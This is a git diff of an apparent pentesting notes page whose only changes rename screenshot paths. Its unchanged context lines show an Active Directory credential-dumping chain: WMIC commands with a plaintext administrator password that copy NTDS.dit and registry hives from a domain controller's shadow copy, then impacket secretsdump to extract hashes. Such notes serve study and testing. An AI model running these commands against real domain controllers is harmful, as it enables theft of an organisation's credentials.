@@ -33,7 +33,7 @@ wmic /node:dc02 /user:administrator@amsterdam.bank.local /password:'Welcome01!' 
 wmic /node:dc02 /user:administrator@amsterdam.bank.local /password:'Welcome01!' process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit c:\temp\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM c:\temp\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY c:\temp\"
 ```
 
-![](<../../../.gitbook/assets/image (3).png>)
+![](<../../../.gitbook/assets/image (3) (2).png>)
 
 {% hint style="info" %}
 Make sure the C:\temp directory exists on the DC before executing this command!
@@ -47,7 +47,7 @@ New-PSDrive -Credential $creds -Name j \\dc02\c$\temp -PSProvider FileSystem
 cd \\dc02\c$\temp
 ```
 
-![](<../../../.gitbook/assets/image (12).png>)
+![](<../../../.gitbook/assets/image (12) (1).png>)
 
 ![](<../../../.gitbook/assets/image (9).png>)
 
@@ -57,7 +57,7 @@ cd \\dc02\c$\temp
 python3 /opt/impacket/examples/secretsdump.py -system SYSTEM -security SECURITY -ntds ntds.dit local
 ```
 
-![](../../../.gitbook/assets/image.png)
+![](<../../../.gitbook/assets/image (11).png>)
 
 ![](<../../../.gitbook/assets/image (14).png>)
 
